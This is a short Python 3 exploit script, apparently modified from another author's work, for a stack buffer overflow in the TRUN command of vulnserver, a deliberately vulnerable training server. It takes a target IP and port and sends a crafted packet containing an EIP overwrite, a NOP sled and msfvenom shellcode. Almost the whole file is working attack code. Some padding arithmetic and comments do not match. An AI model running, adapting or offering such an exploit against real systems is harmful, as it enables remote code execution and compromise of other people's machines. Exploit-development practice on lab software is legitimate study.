#!/usr/bin/python3
import socket,sys

# Modified, (updated to Python3)
# version of sh3llc0d3r's  buffer overflow
# exploit

## usage:
#input 1: IP to target
#input 2: PORT to use

#   target ip                      port
h=str(sys.argv[1]);  p=int(sys.argv[2])

# badchars taken from sh3llc0d3r's "vulnserver-trun-command-buffer-overflow-exploit"
# --------- modified ------------- #
c=(
		b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
		b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
		b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
		b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
		b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
		b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
		b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
		b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
		b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
		b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
		b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
		b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
		b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
		b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
		b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
		b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
	)

# shellcode (denoted 'SH') is from msfvenom.
SH   = b""
SH += b"\xbe\xc4\xb8\xb6\x21\xd9\xe1\xd9\x74\x24\xf4\x5d\x31"
SH += b"\xc9\xb1\x52\x31\x75\x12\x03\x75\x12\x83\x29\x44\x54"
SH += b"\xd4\x4d\x5d\x1b\x17\xad\x9e\x7c\x91\x48\xaf\xbc\xc5"
SH += b"\x19\x80\x0c\x8d\x4f\x2d\xe6\xc3\x7b\xa6\x8a\xcb\x8c"
SH += b"\x0f\x20\x2a\xa3\x90\x19\x0e\xa2\x12\x60\x43\x04\x2a"
SH += b"\xab\x96\x45\x6b\xd6\x5b\x17\x24\x9c\xce\x87\x41\xe8"
SH += b"\xd2\x2c\x19\xfc\x52\xd1\xea\xff\x73\x44\x60\xa6\x53"
SH += b"\x67\xa5\xd2\xdd\x7f\xaa\xdf\x94\xf4\x18\xab\x26\xdc"
SH += b"\x50\x54\x84\x21\x5d\xa7\xd4\x66\x5a\x58\xa3\x9e\x98"
SH += b"\xe5\xb4\x65\xe2\x31\x30\x7d\x44\xb1\xe2\x59\x74\x16"
SH += b"\x74\x2a\x7a\xd3\xf2\x74\x9f\xe2\xd7\x0f\x9b\x6f\xd6"
SH += b"\xdf\x2d\x2b\xfd\xfb\x76\xef\x9c\x5a\xd3\x5e\xa0\xbc"
SH += b"\xbc\x3f\x04\xb7\x51\x2b\x35\x9a\x3d\x98\x74\x24\xbe"
SH += b"\xb6\x0f\x57\x8c\x19\xa4\xff\xbc\xd2\x62\xf8\xc3\xc8"
SH += b"\xd3\x96\x3d\xf3\x23\xbf\xf9\xa7\x73\xd7\x28\xc8\x1f"
SH += b"\x27\xd4\x1d\x8f\x77\x7a\xce\x70\x27\x3a\xbe\x18\x2d"
SH += b"\xb5\xe1\x39\x4e\x1f\x8a\xd0\xb5\xc8\x75\x8c\xb4\x5d"
SH += b"\x1e\xcf\xb6\x4c\x82\x46\x50\x04\x2a\x0f\xcb\xb1\xd3"
SH += b"\x0a\x87\x20\x1b\x81\xe2\x63\x97\x26\x13\x2d\x50\x42"
SH += b"\x07\xda\x90\x19\x75\x4d\xae\xb7\x11\x11\x3d\x5c\xe1"
SH += b"\x5c\x5e\xcb\xb6\x09\x90\x02\x52\xa4\x8b\xbc\x40\x35"
SH += b"\x4d\x86\xc0\xe2\xae\x09\xc9\x67\x8a\x2d\xd9\xb1\x13"
SH += b"\x6a\x8d\x6d\x42\x24\x7b\xc8\x3c\x86\xd5\x82\x93\x40"
SH += b"\xb1\x53\xd8\x52\xc7\x5b\x35\x25\x27\xed\xe0\x70\x58"
SH += b"\xc2\x64\x75\x21\x3e\x15\x7a\xf8\xfa\x25\x31\xa0\xab"
SH += b"\xad\x9c\x31\xee\xb3\x1e\xec\x2d\xca\x9c\x04\xce\x29"
SH += b"\xbc\x6d\xcb\x76\x7a\x9e\xa1\xe7\xef\xa0\x16\x07\x3a"

# --------- modified ------------- #
eip=b"\xaf\x11\x50\x62" 
L=2003
crash_offset=1999 # this causes the DOS (Denial Of Service)
# --------- modified ------------- #
nNops=10
padding = b"\x90" * nNops

# --------- modified ------------- #
pkt = b"TRUN /.:/" + b"A" * L + eip +  padding +SH   + b"C" * (crash_offset - L -len(eip) - len(c) -nNops)
# print(pkt) # for dbg

sock = socket.socket(socket.AF_INET,
								socket.SOCK_STREAM
							)

sock.connect((h, p));  sock.send(pkt)
sock.close()
